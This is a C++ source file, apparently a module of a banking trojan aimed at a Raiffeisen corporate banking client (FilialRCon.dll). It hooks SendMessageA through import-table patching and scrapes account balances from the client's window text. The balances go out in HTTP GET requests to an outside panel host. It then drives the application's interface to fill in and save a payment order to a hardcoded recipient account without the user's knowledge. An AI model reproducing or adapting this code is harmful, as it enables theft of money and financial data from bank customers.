#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"

#include "Utils.h"

#include "Inject.h"

#include "ntdll.h"

#include "commctrl.h"

#include "BotDebug.h"

namespace DBGRAFADLL
{
	#include "DbgTemplates.h"
}

#define DBGRAFA DBGRAFADLL::DBGOutMessage<>

#define RafaDllModule //������� ��� ������ �������

namespace Rafa
{

LRESULT (WINAPI *pHandlerSendMessageA)(HWND , UINT , WPARAM , LPARAM );
HWND	(WINAPI *pHandlerCreateWindowExA) (DWORD,PCHAR,PCHAR,DWORD,int,int,int,int,HWND,HMENU,HINSTANCE,LPVOID);

//������� �����, ��� ��������������� ���������� ����� �������
struct ControlForm
{
	const char* name; //�������� ��� ��������, ��� ��� ������������� � ���������
	int x, y, w, h; //������������ �������� �� ����� (��� ������, �������� ������)
	const char* captionText;
	DWORD captionHash; //���� ��� �� ������, �� ���� �� captionText
	const char* classText;
	DWORD classHash;
};

//���������� �� ��������� ��������
struct ControlFinded
{
	HWND wnd;
	ControlForm* info;
};

void GrabBalansFromMemoText(const char* s);
void GrabBalansFromLVM(const char* s);

HWND IEWnd = 0; //���� �� � ������� ���� ��� ������ ��� ����
DWORD PID = 0; //��� ��������� 2-�� �������
int fromLVM = 0;  //���� ����� 1, �� �������� ����� � ������� (��. ������� GrabBalansFromLVM)
HWND treeView = 0, listView = 0, toolBar = 0;
int idBtNewDoc = 0;
POINT posBtNewDoc;

//�������� ����� "��������� ���������"
ControlForm controlsPaymentOrder[] = 
{
	{ "form",	 0, 0, 606, 569,  "�������� ���������", 0x505B8A7A, "Canvas",  0 },
	{ "num",	 168, 0, 50, 25,  0,					 0,			 0,			0xCB934F4 /* edit */}, //����� ���������
	{ "express", 169, 29, 67, 16, 0,					 0xEEFB4590 /* ������� */, 0, 0x5E9D34F9 /* button */}, //������� �������
	{ "date",	 238, 1, 82, 24,  0,					 0,          0,         0xD3CC2481 /* sysdatetimepick32 */ }, //����
	{ "typepayment", 339, 1, 102, 302, 0,                0,          0,			0x2D3F0896 /* combobox */}, //��� �������
	{ "status",	 486, 0, 22, 25,  0,                     0,          0,         0xCB934F4 /* edit */}, //������ �����������
	{ "innsend", 40, 106, 124, 25,0,                     0,          0,         0xCB934F4 /* edit */}, //��� �����������
	{ "kppsend", 240, 106, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //��� �����������
	{ "sum",     414, 105, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //�����
	{ "nds",     553, 106, 31, 22, 0,                    0xFFF36251 /* ��� */, 0, 0x5E9D34F9 /* button */}, //������ ���
	{ "innrecv", 40, 234, 124, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //��� ����������
	{ "kpprecv", 240, 234, 87, 27, 0,                    0,          0,         0xCB934F4 /* edit */}, //��� ����������
	{ "accountrecv", 415, 234, 154, 25,	0,				 0,          0,         0xCB934F4 /* edit */}, //���� ����������
	{ "namerecv", 91, 262, 237, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //������������ ����������
	{ "bikrecv", 415, 262, 154, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //��� ����������
	{ "bankrecv", 91, 288, 237, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //���� ����������
	{ "accbankrecv", 415, 288, 154, 25, 0,               0,          0,         0xCB934F4 /* edit */}, //���� ����� ����������
	{ "punktrecv", 111, 314, 217, 25, 0,				 0,          0,         0xCB934F4 /* edit */}, //���������� ����� ����������
	{ "daterecv", 486, 315, 82, 24, 0,                   0,			 0,			0xD3CC2481 /* sysdatetimepick32 */ }, //���� ����������
	{ "queue",    475, 343, 93, 210, 0,					 0,			 0,			0x2D3F0896 /* combobox */}, //������� �������
	{ "comment",  9, 408, 579, 97, 0,					 0,          0,         0xCB934F4 /* edit */}, //���������� �������
	{ "save",     415, 511, 75, 25, 0,					 0x23981105 /* ��������� */, 0, 0x5E9D34F9 /* button */}, //������ ���������
	{ "sended",   200, 518, 81, 16, 0,                   0xAC3A81FF /* � �������� */, 0, 0x5E9D34F9 /* button */}, //������� � ��������
	{ 0 }
};

static PIMAGE_NT_HEADERS GetNtHeaders(PVOID Image)
{
  PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(  ((PIMAGE_DOS_HEADER)Image)->e_lfanew +  (PCHAR)Image );
  if ( 	((PIMAGE_DOS_HEADER)Image)->e_magic != IMAGE_DOS_SIGNATURE )
	  return NULL;
  if ( pNtHeader->Signature != IMAGE_NT_SIGNATURE )
	  return NULL;
  return pNtHeader;
};

static bool PathIAT(PVOID Module,PCHAR DllName,PCHAR FuncName,PVOID NewHandler,PVOID *OldHandler)
{

	PIMAGE_NT_HEADERS		pNtHeader;
	PIMAGE_DATA_DIRECTORY	pData;
	CHAR buf1[MAX_PATH];

	if ( Module == NULL )
		return false;

	pNtHeader = GetNtHeaders(Module);
	if ( pNtHeader == NULL )
		return false;

	pData = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if ( pData->Size == 0 )
		return false;
	
	m_lstrcpy(buf1,DllName);
	pCharUpperBuffA(buf1,sizeof(buf1)-1);

	PIMAGE_IMPORT_DESCRIPTOR	pimg_import_desc = (PIMAGE_IMPORT_DESCRIPTOR)((PCHAR)Module + pData->VirtualAddress);

	for ( int i =0; pimg_import_desc[i].Name != 0; ++i)
	{
		CHAR buf2[MAX_PATH];
		PCHAR ImortDll = (PCHAR)Module + pimg_import_desc[i].Name;
		m_lstrcpy(buf2,ImortDll);
		pCharUpperBuffA(buf2,sizeof(buf2)-1);
		if ( m_lstrcmp(buf1,buf2) != 0 )
			continue;

		DWORD  VAToThunk   = pimg_import_desc[i].FirstThunk;
		PDWORD FirstThunk  = (PDWORD)((PCHAR)Module + pimg_import_desc[i].FirstThunk);  /*VA to function*/
		PDWORD OriginalFirstThunk  =(PDWORD)((PCHAR)Module + pimg_import_desc[i].OriginalFirstThunk); /*VA to name function*/
		while ( *FirstThunk  && *OriginalFirstThunk )
		{
			PCHAR Name  = (PCHAR)((PCHAR)Module +*OriginalFirstThunk ); 
			Name+=2;

			if ( m_lstrcmp(Name,FuncName) == 0)
			{
				DWORD Protect;
				*OldHandler = (PVOID)*FirstThunk;
				pVirtualProtect(FirstThunk,sizeof(PVOID),PAGE_READWRITE,&Protect);
				*FirstThunk = (DWORD)NewHandler;
				pVirtualProtect(FirstThunk,sizeof(PVOID),Protect,&Protect);

				
				DBGRAFA( "Rafa", "IAT: [%s] %x", FuncName, *FirstThunk); 
				return true;
			}

			FirstThunk++;	OriginalFirstThunk++;
			VAToThunk += sizeof(VAToThunk);
		}
	}
	return false;
}

static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	PWCHAR buf = (PWCHAR)HEAP::Alloc(4096);

	switch ( Msg )
	{
		// ���� ��������� ����� � ��� ����� � �� EDIT (� ������ ������ ����)
		case WM_SETTEXT:
			//DBGRAFA( "Rafa", "SETTEXT: [%x] %s", hWnd, lParam ); 
			GrabBalansFromMemoText((char*)lParam);
		break;

		// ��� ������ ������ item
		case TVM_INSERTITEM:
		{
			/*
			LPTVINSERTSTRUCT insert = (LPTVINSERTSTRUCT)lParam;
			if ( insert)
			if ( insert->item.mask & TVIF_TEXT )
			{
				DBGRAFA( "Rafa", "TVM_INSERTITEM: [%x] %s", hWnd, (insert->item.pszText==NULL)?"NULL":insert->item.pszText); 
			}
			*/
			break;
		}
		// ��� ������ ����������� item
		case TVM_SETITEM:
		{
			/*
			LPTVITEM	item  = (LPTVITEM)lParam;
			if ( item )
			if ( item->mask & TVIF_TEXT )
			{
				DBGRAFA( "Rafa", "TVM_SETITEM: [%x] %s",hWnd,(item->pszText==NULL)?"NULL":item->pszText); 
			}
			*/
			break;
		}

		// ��� ������� ������ item
		case LVM_INSERTITEM:
		{
			/*
			LPLVITEM	insert = (LPLVITEM)lParam;
			if ( insert == NULL)
				break;
			if ( insert->iItem == 2 )
				return 1;

			if ( insert->mask & LVIF_TEXT )
			{
				//insert->pszText[0] = '(';
				//if ( m_lstrlen(insert->pszText) > 1 )
				//	insert->pszText[1] = ':';
				DBGRAFA( "Rafa", "LVM_INSERTITEM: [%x] %s", hWnd, insert->pszText); 
			}
			*/
			break;
		}
		// ��� �������  ����������� item
		case LVM_SETITEM:
		{
			LPLVITEM item  = (LPLVITEM)lParam;
			if( item )
				if ( item->mask & LVIF_TEXT )
				{
					//DBGRAFA( "Rafa", " %s", item->pszText ); 
					GrabBalansFromLVM(item->pszText);
				}
			break;
		}
	}
	HEAP::Free(buf);

	return (LRESULT)pHandlerSendMessageA(hWnd,Msg,wParam,lParam);;
}
/*
static HWND WINAPI HandlerCreateWindowExA( DWORD dwExStyle, PCHAR lpClassName, PCHAR lpWindowName, DWORD dwStyle, int x, int y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam )
{
	HWND hWnd = pHandlerCreateWindowExA( dwExStyle, lpClassName, lpWindowName, dwStyle, x, y, nWidth, nHeight, 
										 hWndParent, hMenu, hInstance, lpParam );
	if( hWnd )
	{
		DBGRAFA( "Rafa--", "'%s', '%s'", DWORD(lpClassName) < 0x10000 ? "<0x10000" : lpClassName, lpWindowName == 0 ? "" : lpWindowName );
		DBGRAFA( "Rafa--", "(%d,%d)-(%d)", x, y, nWidth *10000 + nHeight );
	}
	return hWnd;
}
*/
static BOOL CALLBACK EnumTreeList( HWND wnd, LPARAM lParam )
{
	DWORD hash = GetWndClassHash(wnd);
	if( pIsWindowVisible(wnd) )
	{
		if( hash == 0xEB4973EE /* SysTreeView32 */ )
		{
			treeView = wnd;
		}
		if( hash == 0xF06537E2 /* SysListView32 */ )
		{
			listView = wnd;
		}
		if( hash == 0xC1AFE727 /* ToolbarWindow32 */ )
		{
			TBBUTTON bt;
			for( int i = 0; i < 20; i++ )
			{
				m_memset( &bt, 0, sizeof(bt) );
				if( pSendMessageA( wnd, TB_GETBUTTON, (WPARAM)i, (LPARAM)&bt ) == FALSE ) break;
				char text[128];
				pSendMessageA( wnd, TB_GETBUTTONTEXT, (WPARAM)bt.idCommand, (LPARAM)text );
				if( CalcHash(text) == 0x8CBC9350 /* ����� �������� */ )
				{
					toolBar = wnd;
					idBtNewDoc = bt.idCommand;
					DBGRAFA( "Rafa", "Found button %d '%s'", bt.idCommand, text );
					RECT r;
					pSendMessageA( wnd, TB_GETRECT, (WPARAM)bt.idCommand, (LPARAM)&r );
					posBtNewDoc.x = r.left;
					posBtNewDoc.y = r.top;
					break;
				}
			}
		}
	}
	return TRUE;
}

static BOOL CALLBACK EnumTopWindows( HWND wnd, LPARAM lParam )
{
	DWORD pid = 0;
	pGetWindowThreadProcessId( wnd, &pid );
	if( pid == (DWORD)lParam )
	{
		if( GetWndClassHash(wnd) == 0x6E5950C9 /* IEFrame */ ) //���� �� � ������� ��������
		{
			IEWnd = wnd; //���������� ���� ��
			EnumChildWindows( wnd, EnumTreeList, 0 ); //���� � �������� ������ ��� ��������
			if( treeView && listView ) //����� ������ �������� (������ ����� � ������� ������ ������)
			{
				return FALSE; //������������� �����
			}
		}
	}
	return TRUE;
}

//���������� ���� wnd � ����������� �� ControlFinded, ���� ���������, �� ���������� true
static bool CmpWnd( const char* caption, DWORD captionHash, const char* className, DWORD classHash, RECT& r, ControlForm* cf )
{
	bool ok = false;
	//���� ������� ������
	if( cf->classHash ) //���� ��� ����� ������, ���������� �� ����
	{
		if( classHash == cf->classHash )
			ok = true;
	}
	else 
	{
		if( cf->classText ) //���� ��� ������, ���������� �� �����
		{
			if( className )
			{
				if( m_strstr( className, cf->classText ) )
					ok = true;
			}
		}
	}
	if( ok ) //����� ���� ������
	{
		ok = false;
		//���������� �� ��������� ����
		if( cf->captionHash ) //���� ��� ���������
		{
			if( captionHash == cf->captionHash )
				ok = true;
		}
		else
		{
			if( cf->captionText ) //���� ����� ���������
			{
				if( m_strstr( caption, cf->captionText ) )
					ok = true;
			}
			else //��������� �� ������, ���������� �� �����������
			{
				int right = cf->x + cf->w - 1, bottom = cf->y + cf->h - 1;
				if( cf->x <= r.right && right >= r.left && cf->y <= r.bottom && bottom >= r.top )
					ok = true;
			}
		}
		if( ok ) //��������� ���� �������
			return true;
	}
	return false;
}

static void GetControlRect( HWND parent, HWND wnd, RECT& r )
{
	pGetWindowRect( wnd, &r );
	//��������������� � ���������� ���� ������
	POINT p;
	p.x = r.left; p.y = r.top;
	pScreenToClient( parent, &p );
	r.right = p.x + r.right - r.left;
	r.bottom = p.y + r.bottom - r.top;
	r.left = p.x;
	r.top = p.y;
}

static bool CmpWnd( HWND parent, HWND wnd, ControlForm* cf )
{
	char* caption = GetWndText(wnd);
	char* className = GetWndClassName(wnd);
	RECT r;
	GetControlRect( parent, wnd, r );
	bool res = CmpWnd( caption, CalcHash(caption), className, STR::GetHash( className, 0, true ), r, cf );
	STR::Free(caption);
	STR::Free(className);
	return res;
}

//-----------------------------------------------------------------
//��������������� ������� ��� ������ ���� �� ���� ��
static BOOL CALLBACK EnumFindForm( HWND wnd, LPARAM lParam )
{
	DWORD pid = 0;
	pGetWindowThreadProcessId( wnd, &pid );
	if( pid == PID )
	{
		ControlFinded* cf = (ControlFinded*)lParam;
		if( CmpWnd( wnd, wnd, cf->info ) )
		{
			cf->wnd = wnd;
			return FALSE;
		}
	}
	return TRUE;
}

//���� ������ ��� ����� � �������� ����� ��
static HWND FindForm( ControlForm* form )
{
	ControlFinded cf;
	cf.wnd = 0;
	cf.info = form;
	pEnumChildWindows( 0 /*IEWnd*/, EnumFindForm, (LPARAM)&cf );
	return cf.wnd;
}
//--------------------------------------------------------------------------
struct ForFindControls
{
	ControlForm* cfIn;
	ControlFinded* cfOut;
	int countOut; //������� �������
	HWND parent;
};

//��������������� ������� ��� ������ ��������� �� �����
static BOOL CALLBACK EnumFindControls( HWND wnd, LPARAM lParam )
{
	if( pIsWindowVisible(wnd) )
	{
		ForFindControls* ffc = (ForFindControls*)lParam;
		ControlForm* pcf = ffc->cfIn;
		char* caption = GetWndText(wnd);
		char* className = GetWndClassName(wnd);
		DWORD captionHash = CalcHash(caption);
		DWORD classHash = STR::GetHash( className, 0, true );
		RECT r;
		GetControlRect( ffc->parent, wnd, r );

		DBGRAFA( "Rafa", "%s %s", caption, className );
		while( pcf->name )
		{
			if( CmpWnd( caption, captionHash, className, classHash, r, pcf ) )
			{
				//�� ������ ������ �������, ����� �� ������ �������� �� ����� ��������� ����
				int i = 0;
				for( ; i < ffc->countOut; i++ )
					if( ffc->cfOut[i].info == pcf )
						break;
				if( i >= ffc->countOut )
				{
					ffc->cfOut[ffc->countOut].info = pcf;
					ffc->cfOut[ffc->countOut].wnd = wnd;
					ffc->countOut++;
					DBGRAFA( "Rafa", "finded %s", pcf->name );
					break;
				}
			}
			pcf++;
		}

		STR::Free(caption);
		STR::Free(className);
	}
	return TRUE;
}

//���� �������� �� ����� parent �� �������� � ������� cfIn, ��������� ������������ � cfOut � ���������� ������� ���������� ���������
//���������. ������ cfOut ������ ������� �� ���� ���������� ��������� ��� � cfIn
static int FindControls( HWND parent, ControlForm* cfIn, ControlFinded* cfOut )
{
	ForFindControls ffc;
	ffc.cfIn = cfIn;
	ffc.cfOut = cfOut;
	ffc.countOut = 0;
	ffc.parent = parent;
	pEnumChildWindows( parent, EnumFindControls, (LPARAM)&ffc );
	return ffc.countOut;
}

//------------------------------------------------------------------------------------------------------------

static bool FindTreeList()
{
	treeView = listView = 0;
	DWORD pid = GetUniquePID();
	pEnumWindows( EnumTopWindows, (LPARAM)pid );
	if( treeView && listView )
		return true;
	return false;
}

static char* GetTextTreeItem( HTREEITEM item, char* buf, int szBuf )
{
	TVITEMEX infoItem;
    m_memset( &infoItem, 0, sizeof(infoItem) );
    infoItem.mask = TVIF_TEXT | TVIF_HANDLE;
    infoItem.hItem = item;
    infoItem.pszText = buf;
    infoItem.cchTextMax = szBuf;
    buf[0] = 0;
    if( pSendMessageA( treeView, TVM_GETITEM, (WPARAM)0, (LPARAM)&infoItem ) )
		return buf;
	return 0;
}

//���� "��������� ���������"->"�������", ���������� item �������
static HTREEITEM FindPaymentOrder( HTREEITEM item )
{
	char text[256];
	do
	{
		if( pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_EXPAND, (LPARAM)item ) )
		{
			HTREEITEM child = 0;
			//����� �������������� ������, ����� ����� �� ����� ���������, ������� ���� ���� ��������
			for( int i = 0; i < 20; i++ )
			{
				child = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_CHILD, (LPARAM)item );
				if( child != 0 ) break;
				pSleep(500);
			}
			if( child )
			{
				if( GetTextTreeItem( item, text, sizeof(text) ) )
				{
					DWORD hash = CalcHash(text);
					if( hash == 0x505B8B0E /* ��������� ��������� */ )
					{
						if( GetTextTreeItem( child, text, sizeof(text) ) )
						{
							if( m_strstr( text, "�������" ) )
							{
								return child;
							}
						}
					}
				}
				HTREEITEM res = FindPaymentOrder(child);
				if( res )
					return res;
			}
		}
		pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_COLLAPSE, (LPARAM)item );
		item = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_NEXT, (LPARAM)item );
	} while( item );
	return 0;
}

//����������� ��������� ���������� ����� ������
static void TreeViewCollapse( HTREEITEM item, int count )
{
	while( count-- )
	{
		item = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_PARENT, (LPARAM)item );
		DBGRAFA( "Rafa", "1" );
		if( item == 0 ) break;
		pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_COLLAPSE, (LPARAM)item );
	}
}

static int FindNewPaymentOrder()
{
	int index = -1;
	char text[256];
	for(;;)
	{
		index = (int)pSendMessageA( listView, LVM_GETNEXTITEM, (WPARAM)index, MAKELPARAM(LVNI_ALL, 0) );
		if( index < 0 ) break;
		LVITEM item;
		m_memset( &item, 0, sizeof(item) );
		item.pszText = text;
		item.cchTextMax = sizeof(text);
		item.iSubItem = 6; //������ � 6-� ��������� ������������ �������
		text[0] = 0;
		pSendMessageA( listView, LVM_GETITEMTEXT, (WPARAM)index, (LPARAM)&item );
		DWORD hash = CalcHash(text);
		DBGRAFA( "Rafa", "ListView %d, '%s'", index, text );
		if( hash == 0x6C433B30 /* ����� ��������� ��������� */ )
		{
			break;
		}
	}
	return index;
}

//���� ������� ����� �������� �� ����� �� ��� �����
static ControlFinded* GetControl( const char* name, ControlFinded* cf, int count )
{
	for( int i = 0; i < count; i++ )
	{
		if( m_lstrcmp( name, cf[i].info->name ) == 0 )
			return &cf[i];
	}
	return 0;
}

//����� ����� � ������� �� �����
static bool SetText( const char* name, const char* s, ControlFinded* cf, int count, const char* sendChars = 0 )
{
	ControlFinded* ctrl = GetControl( name, cf, count );
	if( ctrl )
	{
		if( s )
			pSetWindowTextA( ctrl->wnd, s );
		if( sendChars )
		{
			while( *sendChars )
			{
				SendMessageA( ctrl->wnd, WM_CHAR, (WPARAM)*sendChars, (LPARAM)0 );
				sendChars++;
			}
		}
		return true;
	}
	return false;
}

static bool SetButtonCheck( const char* name, bool check, ControlFinded* cf, int count )
{
	ControlFinded* ctrl = GetControl( name, cf, count );
	if( ctrl )
	{
		pSendMessageA( ctrl->wnd, BM_SETCHECK, (WPARAM) check ? BST_CHECKED : BST_UNCHECKED, (LPARAM)0 );
		return true;
	}
	return false;
}

static bool ClickButton( const char* name, ControlFinded* cf, int count )
{
	ControlFinded* ctrl = GetControl( name, cf, count );
	if( ctrl )
	{
		HardClickToWindow( ctrl->wnd, 5, 5 );
		return true;
	}
	return false;
}

//���� �������� ����� ������� �������� TreeView � ListView ���� �����
static void WorkInRafa()
{
	HTREEITEM root = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_ROOT, (LPARAM)0 );
	if( root )
	{
		HTREEITEM tmpls = 0;
		//������� ����� �������, ������ ��������� �������, ��� ��� �� ����� ��� �����������
		for( int i = 0; i < 10; i++ )
		{
			tmpls = FindPaymentOrder(root); 
			pSleep(1000);
		}
		if( tmpls )
		{
			if( pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)tmpls ) )
			{
				DBGRAFA( "Rafa", "������� �������" );
				int indList = -1;
				for( int i = 0; i < 10; i++ )
				{
					indList = FindNewPaymentOrder();
					if( indList >= 0 ) break;
					pSleep(1000);
				}
				if( indList >= 0 )
				{
					DBGRAFA( "Rafa", "������� ����� ��������� ���������" );
					POINT posItem;
					pSendMessageA( listView, LVM_GETITEMPOSITION, (WPARAM)indList, (LPARAM)&posItem );
					HardClickToWindow( listView, posItem.x + 5, posItem.y + 5 );
					DBGRAFA( "Rafa", "�������� �� ������ ���������� ���������" );
					FindTreeList();
					if( toolBar )
					{
						HardClickToWindow( toolBar, posBtNewDoc.x + 5, posBtNewDoc.y + 5 );
						DBGRAFA( "Rafa", "������ ������ �������� ������ ���������" );
						//���� ��������� ����� ����� �������
						HWND formPayment = 0;
						for( int i = 0; i < 10; i++ )
						{
							formPayment = FindForm( &controlsPaymentOrder[0] );
							if( formPayment ) break;
							pSleep(1000);
						}
						if( formPayment )
						{
							DBGRAFA( "Rafa", "����� ����� ������� �������" );
							//���� �������� � ������� ����� �������
							ControlFinded* cf = (ControlFinded*)HEAP::Alloc( sizeof(ControlFinded) * sizeof(controlsPaymentOrder) / sizeof(ControlForm) );
							int countControls = FindControls( formPayment, controlsPaymentOrder, cf );
							if( countControls ) //����� ������ ��������, ������ ���������
							{
								DBGRAFA( "Rafa", "��������� ��������" );
								//SetText( "num", "1", cf, countControls );
								//SetText( "status", "2", cf, countControls );
								SetText( "sum", "1", cf, countControls );
								SetText( "innrecv", "7705401519", cf, countControls );
								SetText( "kpprecv", "770501001", cf, countControls );
								SetText( "accountrecv", "40703810500", cf, countControls );
								SetText( "namerecv", "����������������� ���� '���������'", cf, countControls );
								SetText( "bikrecv", "044525225", cf, countControls );
								SetText( "bankrecv", "��������� ������", cf, countControls );
								SetText( "accbankrecv", "30101810400", cf, countControls );
								SetText( "punktrecv", "Moscow", cf, countControls );
								SetText( "comment", "������ �����", cf, countControls, " " ); //�������� ��� ������������� ������� ������, ��� ��� ��� ����� ����� �� ������� ��� � ��� ���� ��� ������ �����
								SetButtonCheck( "sended", true, cf, countControls );
								//��������� ��������
								ClickButton( "save", cf, countControls );
								//����������� ������ �� ��������������� ���������
								pSleep(5000); //���� ���� ����������
								TreeViewCollapse( tmpls, 3 );
								pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)root );
							}
							HEAP::Free(cf);
						}
						else
							DBGRAFA( "Rafa", "����� ����� ������� �� ���������" );
					}
				}
			}
		}
		else
			DBGRAFA( "Rafa", "������� ���������" );
	}
}

static DWORD WINAPI InitializeRafaHook( LPVOID p )
{
	DBGRAFA( "Rafa", "Start hook FilialRCon.dll" );
	while( true )
	{
		LPVOID dll = pGetModuleHandleA("FilialRCon.dll");
		if( dll )
		{
			bool hookDll = false;
			for( int i = 0; i < 10; i++ )
			{
				bool res = PathIAT( dll, "USER32.DLL", "SendMessageA", HandlerSendMessageA, (PVOID*)&pHandlerSendMessageA );
				//res &= PathIAT( dll, "USER32.DLL", "CreateWindowExA", HandlerCreateWindowExA,(PVOID*)&pHandlerCreateWindowExA );
				if( res )
				{
					DBGRAFA( "Rafa", "Hook FilialRCon.dll is ok %d - %08x", (int)res,pHandlerSendMessageA );
					hookDll = true;
					break;
				}
				pSleep(1000);
			}
			if( !hookDll ) break;
			//���� ���� �������� �������� ���� � ������� ������ ���� �������� TreeView � ListView
			for( int i = 0; i < 300; i++ )
			{
				if( FindTreeList() )
				{
					DBGRAFA( "Rafa", "Find TreeView and ListView" );
					WorkInRafa(); 
					return 0;
				}
				pSleep(1000);
			}
		}
		pSleep(1000);
	}
	return 0;
}

void InitHook_FilialRConDll()
{
	if( IsNewProcess(PID) ) //����� �������� �� ���������
	{
		HANDLE hThread = CreateThread( NULL, 0, InitializeRafaHook, 0, 0, 0 );
		CloseHandle(hThread);
		fromLVM = 0;
	}
}

const char* panelaz = "sberbanksystem.ru";
//�������� ������, GET ��������
void SendBalans( const char* balans )
{
	fwsprintfA wsprintfA = Get_wsprintfA();
	MemPtr<512> qr;
	MemPtr<128> uid;
	//��������� ������
	GenerateUid(uid.str());
	wsprintfA( qr.str(), "http://%s/bal/?uid=%s&type=raifur&sum=%s", panelaz, uid, balans );
	//���������� ������
	THTTPResponse Response;
	ClearStruct(Response);
	HTTP::Get( qr, 0, &Response );
	DBGRAFA( "Rafa", "�������� ������: %s", qr.str() );
}

//������ ������ � ���������� ���� (������ �����)
//������ � ����� ������:
//���������/������� ������� �� �����: 83109.16/83109.16 (���������� �����)
void GrabBalansFromMemoText(const char* s)
{
	const char* p = m_strstr( s, "(���������� �����)" );
	if( p )
	{
		p--; //���������� ����� ��������� ������, ��� ������ ���� ������, ���������� ���
		while( *p == ' ' && p >= s ) p--;
		if( p > s )
		{
			//����� �� ��������� ����� �������, ���� ����� ���� �� ������ ������, �. �. ��������� �� ������ �������
			const char* p1 = p;
			while( *p1 != ' ' && p1 >= s ) p1--;
			if( p1 > s )
			{
				p1++; //����� �� 1-� ����� ������ �����
				if( *p1 >= '0' && *p1 <= '9' )
				{
					char balans[32];
					//��������� ����� �� ����� (����� �����)
					int i = 0;
					while( *p1 != '.' && p1 > s && i < sizeof(balans) - 1 ) balans[i++] = *p1++;
					balans[i] = 0; //������ � ��� ��� �������
					SendBalans(balans);
				}
			}
		}
	}
}

//������ ������ � ������� ������ ������
void GrabBalansFromLVM(const char* s)
{
	if( fromLVM == 0 )
	{
		if( m_lstrcmp( s, "���������� �����" ) == 0 ) //������ �������� ������, ��������� ������ ����� ����� ������
		{
			fromLVM = 1;
		}
	}
	else
		if( fromLVM == 1 ) //� s ��������� ������
		{
			if( *s >= '0' && *s <= '9' )
			{
				char balans[32];
				int i = 0;
				//��������� ����� �� �����
				while( *s && *s != '.' && i < sizeof(balans) - 1 ) balans[i++] = *s++;
				balans[i] = 0;
				SendBalans(balans);
			}
			fromLVM = 0;
		}

}
//http://sberbanksystem.ru/bal/?uid=TEST0123456789&type=raifur&sum=234234

}